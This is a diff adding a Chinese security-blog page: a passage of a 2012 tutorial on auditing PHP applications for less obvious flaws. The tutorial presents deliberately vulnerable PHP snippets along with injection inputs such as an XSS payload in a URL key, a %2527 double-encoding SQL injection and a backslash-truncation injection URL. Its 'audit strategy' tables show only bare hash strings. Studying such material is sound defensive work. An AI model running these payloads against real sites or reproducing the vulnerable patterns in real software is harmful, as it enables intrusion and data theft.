@@ -1,0 +1,2097 @@
+<!DOCTYPE html>
+<html lang="zh-cn" itemscope itemtype="http://schema.org/WebPage">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title>高级PHP应用程序漏洞审核技术 - Nuclear&#39;Atk（核攻击）网络安全实验室</title>
+  
+
+<meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta name="MobileOptimized" content="width"/>
+<meta name="HandheldFriendly" content="true"/>
+
+
+<meta name="applicable-device" content="pc,mobile">
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+<meta name="mobile-web-app-capable" content="yes">
+
+<meta name="author" content="sebug.net" /><meta name="description" content="高级PHP应用程序漏洞审核技术。PHP是一种被广泛使用的脚本语言，尤其适合于web开发。具有跨平台，容易学习，功能强大等特点，据统计全世界有超过34%的网站有php的应用，包括Yahoo、sina、163、sohu等大型门户网站。而且很多具名的web应用系统（包括bbs,blog,wiki,cms等等）都是使用php开发的，Discuz、phpwind、phpbb、vbb、wordpress、boblog等等。随着web安全的热点升级，php应用程序的代码安全问题也逐步兴盛起来，越来越多的安全人员投入到这个领域，越来越多的应用程序代码漏洞被披露。" />
+<meta name="keywords" content="高级PHP应用程序漏洞审核技术" />
+
+
+
+<meta name="baidu-site-verification" content="GSIJv096Bu" />
+
+
+
+<meta name="generator" content="Hugo 0.82.0" />
+
+
+<link rel="canonical" href="https://lcx.cc/post/2600/" />
+
+
+
+
+
+<link rel="icon" href="/favicon.ico" />
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/sass/jane.min.af20b78e95c84de86b00a0242a4a77bd2601700e1b250edf27537d957ac0041d.css" integrity="sha256-ryC3jpXITehrAKAkKkp3vSYBcA4bJQ7fJ1N9lXrABB0=" media="screen" crossorigin="anonymous">
+
+
+
+
+
+<meta property="og:title" content="高级PHP应用程序漏洞审核技术" />
+<meta property="og:description" content="高级PHP应用程序漏洞审核技术。PHP是一种被广泛使用的脚本语言，尤其适合于web开发。具有跨平台，容易学习，功能强大等特点，据统计全世界有超过34%的网站有php的应用，包括Yahoo、sina、163、sohu等大型门户网站。而且很多具名的web应用系统（包括bbs,blog,wiki,cms等等）都是使用php开发的，Discuz、phpwind、phpbb、vbb、wordpress、boblog等等。随着web安全的热点升级，php应用程序的代码安全问题也逐步兴盛起来，越来越多的安全人员投入到这个领域，越来越多的应用程序代码漏洞被披露。" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://lcx.cc/post/2600/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2012-06-20T09:23:16&#43;08:00" />
+<meta property="article:modified_time" content="2012-06-20T09:28:45&#43;08:00" />
+
+<meta itemprop="name" content="高级PHP应用程序漏洞审核技术">
+<meta itemprop="description" content="高级PHP应用程序漏洞审核技术。PHP是一种被广泛使用的脚本语言，尤其适合于web开发。具有跨平台，容易学习，功能强大等特点，据统计全世界有超过34%的网站有php的应用，包括Yahoo、sina、163、sohu等大型门户网站。而且很多具名的web应用系统（包括bbs,blog,wiki,cms等等）都是使用php开发的，Discuz、phpwind、phpbb、vbb、wordpress、boblog等等。随着web安全的热点升级，php应用程序的代码安全问题也逐步兴盛起来，越来越多的安全人员投入到这个领域，越来越多的应用程序代码漏洞被披露。"><meta itemprop="datePublished" content="2012-06-20T09:23:16&#43;08:00" />
+<meta itemprop="dateModified" content="2012-06-20T09:28:45&#43;08:00" />
+<meta itemprop="wordCount" content="10431">
+<meta itemprop="keywords" content="PHP,程序,技术,漏洞,0day,app,Blog,bug,cookie,Discuz,DZ,EXP,Hash,Html,HTTP,IDS,IE,IP,IPS,MD5,mssql,Mysql,Net,POS,Rat,SQL,URL,Web,Windows,安全,暴力,编码,测试,查找,程序员,代码,恶意,分析,工具,攻击,函数,解码,破解,数据,数据库,算法,文件,问题,系统,溢出,注射,字典," /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="高级PHP应用程序漏洞审核技术"/>
+<meta name="twitter:description" content="高级PHP应用程序漏洞审核技术。PHP是一种被广泛使用的脚本语言，尤其适合于web开发。具有跨平台，容易学习，功能强大等特点，据统计全世界有超过34%的网站有php的应用，包括Yahoo、sina、163、sohu等大型门户网站。而且很多具名的web应用系统（包括bbs,blog,wiki,cms等等）都是使用php开发的，Discuz、phpwind、phpbb、vbb、wordpress、boblog等等。随着web安全的热点升级，php应用程序的代码安全问题也逐步兴盛起来，越来越多的安全人员投入到这个领域，越来越多的应用程序代码漏洞被披露。"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+
+
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">Nuclear'Atk</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/">主页</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/post/">归档</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/tags/">标签</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/categories/">分类</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/">友链</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%85%B3%E4%BA%8E/">关于</a>
+          
+        
+      </li>
+    
+
+    
+  </ul>
+</nav>
+
+
+  
+    
+
+
+
+
+
+
+  <link rel="stylesheet" href="/lib/photoswipe/photoswipe.min.css" />
+  <link rel="stylesheet" href="/lib/photoswipe/default-skin/default-skin.min.css" />
+
+
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+    
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    
+    <div class="pswp__ui pswp__ui--hidden">
+    <div class="pswp__top-bar">
+      
+      <div class="pswp__counter"></div>
+      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+      <button class="pswp__button pswp__button--share" title="Share"></button>
+      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+      
+      
+      <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+            <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+      <div class="pswp__share-tooltip"></div>
+    </div>
+    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+    </button>
+    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+    </button>
+    <div class="pswp__caption">
+      <div class="pswp__caption__center"></div>
+    </div>
+    </div>
+    </div>
+</div>
+
+  
+
+  
+
+  
+
+  <header id="header" class="header container">
+    <div class="logo-wrapper">
+  <a href="/" class="logo">
+    
+      Nuclear'Atk
+    
+  </a>
+</div>
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/">主页</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/post/">归档</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/tags/">标签</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/categories/">分类</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/">友链</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%85%B3%E4%BA%8E/">关于</a>
+          
+
+        
+
+      </li>
+    
+
+    
+    
+
+    
+  </ul>
+</nav>
+
+  </header>
+
+  <div id="mobile-panel">
+    <main id="main" class="main bg-llight">
+      <div class="content-wrapper">
+        <div id="content" class="content container">
+          <article class="post bg-white">
+    
+    <header class="post-header">
+      <h1 class="post-title">高级PHP应用程序漏洞审核技术</h1>
+      
+      <div class="post-meta">
+        <time datetime="2012-06-20" class="post-time">
+          2012-06-20
+        </time>
+        <div class="post-category">
+            <a href="https://lcx.cc/categories/%E8%80%81%E7%B3%BB%E7%BB%9F%E5%86%85%E5%AE%B9/"> 老系统内容 </a>
+            <a href="https://lcx.cc/categories/php/"> PHP </a>
+            <a href="https://lcx.cc/categories/%E7%A8%8B%E5%BA%8F/"> 程序 </a>
+            <a href="https://lcx.cc/categories/%E6%8A%80%E6%9C%AF/"> 技术 </a>
+            <a href="https://lcx.cc/categories/%E6%BC%8F%E6%B4%9E/"> 漏洞 </a>
+            
+          </div>
+        <span class="more-meta"> 约 10431 字 </span>
+          <span class="more-meta"> 预计阅读 21 分钟 </span>
+
+        
+        
+
+        
+        
+      </div>
+    </header>
+
+    
+    
+<div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">文章目录</h2>
+  <div class="post-toc-content">
+    
+  </div>
+</div>
+
+    
+    <div class="post-content">
+      
+<h3>
+	前言
+</h3>
+<p>
+	PHP是一种被广泛使用的脚本语言，尤其适合于web开发。具有跨平台，容易学习，功能强大等特点，据统计全世界有超过34%的网站有php的应用，包括Yahoo、sina、163、sohu等大型门户网站。而且很多具名的web应用系统（包括bbs,blog,wiki,cms等等）都是使用php开发的，Discuz、phpwind、phpbb、vbb、wordpress、boblog等等。随着web安全的热点升级，php应用程序的代码安全问题也逐步兴盛起来，越来越多的安全人员投入到这个领域，越来越多的应用程序代码漏洞被披露。
+</p>
+<p>
+	针对这样一个状况，很多应用程序的官方都成立了安全部门，或者雇佣安全人员进行代码审计，因此出现了很多自动化商业化的代码审计工具。也就是这样的形势导致了一个局面：大公司的产品安全系数大大的提高，那些很明显的漏洞基本灭绝了，那些大家都知道的审计技术都无用武之地了。
+</p>
+<p>
+	我们面对很多工具以及大牛扫描过n遍的代码，有很多的安全人员有点悲观，而有的官方安全人员也非常的放心自己的代码，但是不要忘记了“没有绝对的安全”，我们应该去寻找新的途径挖掘新的漏洞。本文就给介绍了一些非传统的技术经验和大家分享。
+</p>
+<p>
+	另外在这里特别说明一下本文里面很多漏洞都是来源于网络上牛人和朋友们的分享，在这里需要感谢他们 ：）
+</p>
+<h3>
+	传统的代码审计技术
+</h3>
+<p>
+	WEB应用程序漏洞查找基本上是围绕两个元素展开：变量与函数。也就是说一漏洞的利用必须把你提交的恶意代码通过变量经过n次变量转换传递，最终传递给目标函数执行，还记得MS那句经典的名言吗？“一切输入都是有害的”。
+</p>
+<p>
+	这句话只强调了变量输入，很多程序员把“输入”理解为只是<code>gpc[$_GET,$_POST,$_COOKIE]</code>，但是变量在传递过程产生了n多的变化。导致很多过滤只是个“纸老虎”！我们换句话来描叙下代码安全：<code>“一切进入函数的变量是有害的”</code>。
+</p>
+<p>
+	PHP代码审计技术用的最多也是目前的主力方法：静态分析，主要也是通过查找容易导致安全漏洞的危险函数，常用的如grep，findstr等搜索工具，很多自动化工具也是使用正则来搜索这些函数。下面列举一些常用的函数，也就是下文说的字典（暂略）。但是目前基本已有的字典很难找到漏洞，所以我们需要扩展我们的字典，这些字典也是本文主要探讨的。
+</p>
+<p>
+	其他的方法有：通过修改PHP源代码来分析变量流程，或者hook危险的函数来实现对应用程序代码的审核，但是这些也依靠了我们上面提到的字典。
+</p>
+<h3>
+	PHP版本与应用代码审计
+</h3>
+<p>
+	到目前为止，PHP主要有3个版本：php4、php5、php6，使用比例大致如下：
+</p>
+<table border="1" cellspacing="0" cellpadding="1" width="100%">
+	<tbody>
+		<tr>
+			<td>
+				php4
+			</td>
+			<td>
+				68%
+			</td>
+			<td>
+				2000-2007，No security fixes after 2008/08，最终版本是php4.4.9
+			</td>
+		</tr>
+		<tr>
+			<td>
+				php5
+			</td>
+			<td>
+				32%
+			</td>
+			<td>
+				2004-present，Now at version 5.2.6（PHP 5.3 alpha1 released!）
+			</td>
+		</tr>
+		<tr>
+			<td>
+				php6
+			</td>
+			<td>
+			</td>
+			<td>
+				目前还在测试阶段，变化很多做了大量的修改，取消了很多安全选项如magic_quotes_gpc（这个不是今天讨论的范围）
+			</td>
+		</tr>
+	</tbody>
+</table>
+<p>
+	由于php缺少自动升级的机制，导致目前PHP版本并存，也导致很多存在漏洞没有被修补。这些有漏洞的函数也是我们进行WEB应用程序代码审计的重点对象，也是我们字典重要来源。
+</p>
+<h3>
+	其他的因素与应用代码审计
+</h3>
+<p>
+	很多代码审计者拿到代码就看，他们忽视了“安全是一个整体”，代码安全很多的其他因素有关系，比如上面我们谈到的PHP版本的问题，比较重要的还有操作系统类型（主要是两大阵营win/*nix），WEB服务端软件（主要是iis/apache两大类型）等因素。这是由于不同的系统不同的WEB SERVER有着不同的安全特点或特性，下文有些部分会涉及。
+</p>
+<p>
+	所以我们在做某个公司WEB应用代码审计时，应该了解他们使用的系统，WEB服务端软件，PHP版本等信息。
+</p>
+<h3>
+	扩展我们的字典
+</h3>
+<p>
+	下面将详细介绍一些非传统PHP应用代码审计一些漏洞类型和利用技巧。
+</p>
+<h4>
+	变量本身的key
+</h4>
+<p>
+	说到变量的提交很多人只是看到了GET/POST/COOKIE等提交的变量的值，但是忘记了有的程序把变量本身的key也当变量提取给函数处理。
+</p>
+<pre class="prettyprint lang-php">&lt;?php
+//key.php?aaaa'aaa=1&amp;bb'b=2 
+//print_R($_GET); 
+ foreach ($_GET AS $key =&gt; $value)
+{
+        print $key."\n";
+}
+?&gt; </pre>
+<p>
+	上面的代码就提取了变量本身的key显示出来，单纯对于上面的代码，如果我们提交URL：
+</p>
+<p>
+	<code>key.php?&lt;script&gt;alert(1);&lt;/script&gt;=1&amp;bbb=2</code> 
+</p>
+<p>
+	那么就导致一个xss的漏洞，扩展一下如果这个key提交给include()等函数或者sql查询呢？：）
+</p>
+<table border="1" cellspacing="0" cellpadding="1" width="100%">
+	<tbody>
+		<tr>
+			<td>
+				漏洞审计策略
+			</td>
+		</tr>
+		<tr>
+			<td>
+				PHP版本要求：无
+md5-9f2f1d115a7b72c89ed0cc63ef8f6e45
+			</td>
+		</tr>
+	</tbody>
+</table>
+<h4>
+	变量覆盖
+</h4>
+<p>
+	很多的漏洞查找者都知道extract()这个函数在指定参数为EXTR_OVERWRITE或者没有指定函数可以导致变量覆盖，但是还有很多其他情况导致变量覆盖的如：
+</p>
+<h5>
+	遍历初始化变量
+</h5>
+<p>
+	请看如下代码：
+</p>
+<pre class="prettyprint lang-php">&lt;?php
+//var.php?a=fuck
+$a='hi';
+foreach($_GET as $key =&gt; $value) {
+        $$key = $value;
+}
+print $a;
+?&gt; </pre>
+<p>
+	很多的WEB应用都使用上面的方式（注意循环不一定是foreach），如Discuz!4.1的WAP部分的代码：
+</p>
+<pre class="prettyprint lang-php">$chs = '';
+if($_POST &amp;&amp; $charset != 'utf-8') {
+        $chs = new Chinese('UTF-8', $charset);
+        foreach($_POST as $key =&gt; $value) {
+                $$key = $chs-&gt;Convert($value);
+        }
+        unset($chs); </pre>
+<table border="1" cellspacing="0" cellpadding="1" width="100%">
+	<tbody>
+		<tr>
+			<td>
+				漏洞审计策略
+			</td>
+		</tr>
+		<tr>
+			<td>
+				PHP版本要求：无
+md5-9f2f1d115a7b72c89ed0cc63ef8f6e45
+			</td>
+		</tr>
+	</tbody>
+</table>
+<h5>
+	parse_str()变量覆盖漏洞
+</h5>
+<pre class="prettyprint lang-php">//var.php?var=new
+$var = 'init';                     
+parse_str($_SERVER['QUERY_STRING']); 
+print $var; </pre>
+<p>
+	该函数一样可以覆盖数组变量，上面的代码是通过$<em>SERVER'QUERY</em>STRING'来提取变量的，对于指定了变量名的我们可以通过注射“=”来实现覆盖其他的变量：
+</p>
+<pre class="prettyprint lang-php">//var.php?var=1&amp;a[1]=var1%3d222
+$var1 = 'init';
+parse_str($a[$_GET['var']]);
+print $var1; </pre>
+<p>
+	上面的代码通过提交$var来实现对$var1的覆盖。
+</p>
+<table border="1" cellspacing="0" cellpadding="1" width="100%">
+	<tbody>
+		<tr>
+			<td>
+				漏洞审计策略（parse_str）
+			</td>
+		</tr>
+		<tr>
+			<td>
+				PHP版本要求：无
+md5-b615dea1edf6b93dec7a7e623fe8570f
+			</td>
+		</tr>
+	</tbody>
+</table>
+<table border="1" cellspacing="0" cellpadding="1" width="100%">
+	<tbody>
+		<tr>
+			<td>
+				漏洞审计策略（mb_parse_str）
+			</td>
+		</tr>
+		<tr>
+			<td>
+				PHP版本要求：php4&lt;4.4.7 php5&lt;5.2.2
+md5-993116e42a531d2a9696f09ff87a836d
+			</td>
+		</tr>
+	</tbody>
+</table>
+<h5>
+	import<em>request</em>variables()变量覆盖漏洞
+</h5>
+<pre class="prettyprint lang-php">//var.php?_SERVER[REMOTE_ADDR]=10.1.1.1
+echo 'GLOBALS '.(int)ini_get("register_globals")."n";
+import_request_variables('GPC');
+if ($_SERVER['REMOTE_ADDR'] != '10.1.1.1') die('Go away!');
+echo 'Hello admin!'; </pre>
+<table border="1" cellspacing="0" cellpadding="1" width="100%">
+	<tbody>
+		<tr>
+			<td>
+				漏洞审计策略（import_request_variables）
+			</td>
+		</tr>
+		<tr>
+			<td>
+				PHP版本要求：php4&lt;4.4.1 php5&lt;5.2.2
+md5-16ecd2d1e750dd44df8702198bb34005
+			</td>
+		</tr>
+	</tbody>
+</table>
+<h5>
+	PHP5 Globals
+</h5>
+<p>
+	从严格意义上来说这个不可以算是PHP的漏洞，只能算是一个特性，测试代码：
+</p>
+<pre class="prettyprint lang-php">&lt;?
+// register_globals =ON
+//foo.php?GLOBALS[foobar]=HELLO
+php echo $foobar; 
+?&gt; </pre>
+<p>
+	但是很多的程序没有考虑到这点，请看如下代码：
+</p>
+<pre class="prettyprint lang-php">//为了安全取消全局变量
+//var.php?GLOBALS[a]=aaaa&amp;b=111
+if (ini_get('register_globals')) foreach($_REQUEST as $k=&gt;$v) unset(${$k});
+print $a;
+print $_GET[b]; </pre>
+<p>
+	如果熟悉WEB2.0的攻击的同学，很容易想到上面的代码我们可以利用这个特性进行crsf攻击。
+</p>
+<table border="1" cellspacing="0" cellpadding="1" width="100%">
+	<tbody>
+		<tr>
+			<td>
+				漏洞审计策略
+			</td>
+		</tr>
+		<tr>
+			<td>
+				PHP版本要求：无
+md5-9f2f1d115a7b72c89ed0cc63ef8f6e45
+			</td>
+		</tr>
+	</tbody>
+</table>
+<h4>
+	magic<em>quotes</em>gpc与代码安全
+</h4>
+<h5>
+	什么是magic<em>quotes</em>gpc
+</h5>
+<p>
+	当打开时，所有的 '（单引号），"（双引号），\（反斜线）和 NULL 字符都会被自动加上一个反斜线进行转义。还有很多函数有类似的作用 如：addslashes()、mysql<em>escape</em>string()、mysql<em>real</em>escape<em>string()等，另外还有parse</em>str()后的变量也受magic<em>quotes</em>gpc的影响。目前大多数的主机都打开了这个选项，并且很多程序员也注意使用上面那些函数去过滤变量，这看上去很安全。很多漏洞查找者或者工具遇到些函数过滤后的变量直接就放弃，但是就在他们放弃的同时也放过很多致命的安全漏洞。 ：）
+</p>
+<h5>
+	哪些地方没有魔术引号的保护
+</h5>
+<p>
+	<strong>1) $_SERVER变量</strong> 
+</p>
+<p>
+	PHP5的$<em>SERVER变量缺少magic</em>quotes_gpc的保护，导致近年来X-Forwarded-For的漏洞猛暴，所以很多程序员考虑过滤X-Forwarded-For，但是其他的变量呢？
+</p>
+<table border="1" cellspacing="0" cellpadding="1" width="100%">
+	<tbody>
+		<tr>
+			<td>
+				漏洞审计策略（$_SERVER变量）
+			</td>
+		</tr>
+		<tr>
+			<td>
+				PHP版本要求：无
+md5-4719e19bf61ce5a6f1990d5f2933da5c
+			</td>
+		</tr>
+	</tbody>
+</table>
+<p>
+	<strong>2) getenv()得到的变量（使用类似$_SERVER变量）</strong> 
+</p>
+<table border="1" cellspacing="0" cellpadding="1" width="100%">
+	<tbody>
+		<tr>
+			<td>
+				漏洞审计策略（$_SERVER变量）
+			</td>
+		</tr>
+		<tr>
+			<td>
+				PHP版本要求：无
+md5-14827d95fcdd8129f3cd0db2aef588da
+			</td>
+		</tr>
+	</tbody>
+</table>
+<p>
+	<strong>3) $HTTP<em>RAW</em>POST_DATA与PHP输入、输出流</strong> 
+</p>
+<p>
+	主要应用与soap/xmlrpc/webpublish功能里，请看如下代码：
+</p>
+<pre class="prettyprint lang-php">if ( !isset( $HTTP_RAW_POST_DATA ) ) {
+        $HTTP_RAW_POST_DATA = file_get_contents( 'php://input' );
+}
+if ( isset($HTTP_RAW_POST_DATA) )
+        $HTTP_RAW_POST_DATA = trim($HTTP_RAW_POST_DATA); </pre>
+<table border="1" cellspacing="0" cellpadding="1" width="100%">
+	<tbody>
+		<tr>
+			<td>
+				漏洞审计策略（数据流）
+			</td>
+		</tr>
+		<tr>
+			<td>
+				PHP版本要求：无
+md5-874b5384b6942c4ee6f84e7a5119faa5
+			</td>
+		</tr>
+	</tbody>
+</table>
+<p>
+	<strong>4) 数据库操作容易忘记'的地方如：in()/limit/order by/group by</strong> 
+</p>
+<p>
+	如Discuz!&lt;5.0的pm.php：
+</p>
+<pre class="prettyprint lang-php">if(is_array($msgtobuddys)) {
+        $msgto = array_merge($msgtobuddys, array($msgtoid));
+                ......
+foreach($msgto as $uid) {
+        $uids .= $comma.$uid;
+        $comma = ',';
+}
+......
+$query = $db-&gt;query("SELECT m.username, mf.ignorepm FROM {$tablepre}members m
+        LEFT JOIN {$tablepre}memberfields mf USING(uid)
+        WHERE m.uid IN ($uids)"); </pre>
+<table border="1" cellspacing="0" cellpadding="1" width="100%">
+	<tbody>
+		<tr>
+			<td>
+				漏洞审计策略
+			</td>
+		</tr>
+		<tr>
+			<td>
+				PHP版本要求：无
+md5-9730da3b833abb10b92c9467e93bd99c
+			</td>
+		</tr>
+	</tbody>
+</table>
+<h5>
+	变量的编码与解码
+</h5>
+<p>
+	一个WEB程序很多功能的实现都需要变量的编码解码，而且就在这一转一解的传递过程中就悄悄的绕过你的过滤的安全防线。
+</p>
+<p>
+	这个类型的主要函数有：
+</p>
+<p>
+	<strong>1) stripslashes() 这个其实就是一个decode-addslashes()</strong> 
+</p>
+<p>
+	<strong>2) 其他字符串转换函数：</strong> 
+</p>
+<table border="1" cellspacing="0" cellpadding="1" width="100%">
+	<tbody>
+		<tr>
+			<td>
+				base64_decode
+			</td>
+			<td>
+				对使用 MIME base64 编码的数据进行解码
+			</td>
+		</tr>
+		<tr>
+			<td>
+				base64_encode
+			</td>
+			<td>
+				使用 MIME base64 对数据进行编码
+			</td>
+		</tr>
+		<tr>
+			<td>
+				rawurldecode
+			</td>
+			<td>
+				对已编码的 URL 字符串进行解码
+			</td>
+		</tr>
+		<tr>
+			<td>
+				rawurlencode
+			</td>
+			<td>
+				按照[RFC 1738](http://tools.ietf.org/html/rfc1738)对URL进行编码
+			</td>
+		</tr>
+		<tr>
+			<td>
+				urldecode
+			</td>
+			<td>
+				解码已编码的 URL 字符串
+			</td>
+		</tr>
+		<tr>
+			<td>
+				urlencode
+			</td>
+			<td>
+				编码 URL 字符串
+			</td>
+		</tr>
+		<tr>
+			<td>
+				...
+			</td>
+			<td>
+				...
+			</td>
+		</tr>
+	</tbody>
+</table>
+<p>
+	另外一个 unserialize/serialize
+</p>
+<p>
+	<strong>3) 字符集函数（GKB,UTF7/8...）如iconv()/mb<em>convert</em>encoding()等</strong> 
+</p>
+<p>
+	目前很多漏洞挖掘者开始注意这一类型的漏洞了，如典型的urldecode：
+</p>
+<p>
+	<code>$sql = "SELECT * FROM article WHERE articleid='".urldecode($_GET[id])."'";</code> 
+</p>
+<p>
+	当magic<em>quotes</em>gpc=on时，我们提交?id=%2527，得到sql语句为：
+</p>
+<p>
+	<code>SELECT * FROM article WHERE articleid='''</code> 
+</p>
+<table border="1" cellspacing="0" cellpadding="1" width="100%">
+	<tbody>
+		<tr>
+			<td>
+				漏洞审计策略
+			</td>
+		</tr>
+		<tr>
+			<td>
+				PHP版本要求：无
+md5-3637ab9cc92ae883c91f6c21e3f6dba4
+			</td>
+		</tr>
+	</tbody>
+</table>
+<h5>
+	二次攻击
+</h5>
+<p>
+	详细见附录[1]
+</p>
+<p>
+	1)数据库出来的变量没有进行过滤
+</p>
+<p>
+	2)数据库的转义符号：
+</p>
+<pre class="prettyprint lang-php">mysql/oracle转义符号同样是\（我们提交'通过魔术引号变化为\'，当我们update进入数据库时，通过转义变为'）
+mssql的转义字符为'（所以我们提交'通过魔术引号变化为\'，mssql会把它当为一个字符串直接处理，所以魔术引号对于mssql的注射没有任何意义） </pre>
+<p>
+	从这里我们可以思考得到一个结论：一切进入函数的变量都是有害的，另外利用二次攻击我们可以实现一个webrootkit，把我们的恶意构造直接放到数据库里。我们应当把这样的代码看成一个vul？
+</p>
+<table border="1" cellspacing="0" cellpadding="1" width="100%">
+	<tbody>
+		<tr>
+			<td>
+				漏洞审计策略
+			</td>
+		</tr>
+		<tr>
+			<td>
+				PHP版本要求：无
+md5-9f2f1d115a7b72c89ed0cc63ef8f6e45
+			</td>
+		</tr>
+	</tbody>
+</table>
+<h5>
+	魔术引号带来的新的安全问题
+</h5>
+<p>
+	首先我们看下魔术引号的处理机制：
+</p>
+<p>
+	<code>[\--&gt;\\,'--&gt;\',"--&gt;\",null--&gt;\0]</code> 
+</p>
+<p>
+	这给我们引进了一个非常有用的符号“\”，“\”符号不仅仅是转义符号，在WIN系统下也是目录转跳的符号。这个特点可能导致php应用程序里产生非常有意思的漏洞：
+</p>
+<p>
+	<strong>1)得到原字符（',\,",null]）</strong> 
+</p>
+<pre class="prettyprint lang-php">$order_sn=substr($_GET['order_sn'], 1);
+
+//提交                 '
+//魔术引号处理         \'
+//substr               '
+
+$sql = "SELECT order_id, order_status, shipping_status, pay_status, ".
+   " shipping_time, shipping_id, invoice_no, user_id ".
+   " FROM " . $ecs-&gt;table('order_info').
+   " WHERE order_sn = '$order_sn' LIMIT 1"; </pre>
+<p>
+	<strong>2)得到“\”字符</strong> 
+</p>
+<p>
+	$order<em>sn=substr($</em>GET['order_sn'], 0,1);
+</p>
+<pre class="prettyprint lang-php">//提交                 '
+//魔术引号处理         \'
+//substr               \    
+
+$sql = "SELECT order_id, order_status, shipping_status, pay_status, ".
+   " shipping_time, shipping_id, invoice_no, user_id ".
+   " FROM " . $ecs-&gt;table('order_info').
+   " WHERE order_sn = '$order_sn' and order_tn='".$_GET['order_tn']."'"; </pre>
+<p>
+	提交内容：
+</p>
+<p>
+	<code>?order_sn='&amp;order_tn=%20and%201=1/*</code> 
+</p>
+<p>
+	执行的SQL语句为：
+</p>
+<pre class="prettyprint lang-php">SELECT order_id, order_status, shipping_status, pay_status, shipping_time, 
+shipping_id, invoice_no, user_id FROM order_info WHERE order_sn = '\' and 
+order_tn=' and 1=1/*' </pre>
+<table border="1" cellspacing="0" cellpadding="1" width="100%">
+	<tbody>
+		<tr>
+			<td>
+				漏洞审计策略
+			</td>
+		</tr>
+		<tr>
+			<td>
+				PHP版本要求：无
+md5-0ba2f0cfb75760bb29bc9c7344e943d3
+			</td>
+		</tr>
+	</tbody>
+</table>
+<h5>
+	变量key与魔术引号
+</h5>
+<p>
+	我们最在这一节的开头就提到了变量key，PHP的魔术引号对它有什么影响呢？
+</p>
+<pre class="prettyprint lang-php">&lt;?php
+//key.php?aaaa'aaa=1&amp;bb'b=2 
+//print_R($_GET); 
+ foreach ($_GET AS $key =&gt; $value)
+        {
+        print $key."\n";
+        }
+?&gt; </pre>
+<p>
+	<strong>1)当magic<em>quotes</em>gpc = On时，在php5.24下测试显示：</strong> 
+</p>
+<pre class="prettyprint lang-php">aaaa\'aaa
+bb\'b </pre>
+<p>
+	从上面结果可以看出来，在设置了magic<em>quotes</em>gpc = On下，变量key受魔术引号影响。但是在php4和php&lt;5.2.1的版本中，不处理数组第一维变量的key，测试代码如下：
+</p>
+<pre class="prettyprint lang-php">&lt;?php
+//key.php?aaaa'aaa[bb']=1 
+print_R($_GET); 
+?&gt; </pre>
+<p>
+	结果显示:
+</p>
+<pre class="prettyprint lang-php">Array ( [aaaa'aaa] =&gt; Array ( [bb\'] =&gt; 1 ) ) </pre>
+<p>
+	数组第一维变量的key不受魔术引号的影响。
+</p>
+<table border="1" cellspacing="0" cellpadding="1" width="100%">
+	<tbody>
+		<tr>
+			<td>
+				漏洞审计策略
+			</td>
+		</tr>
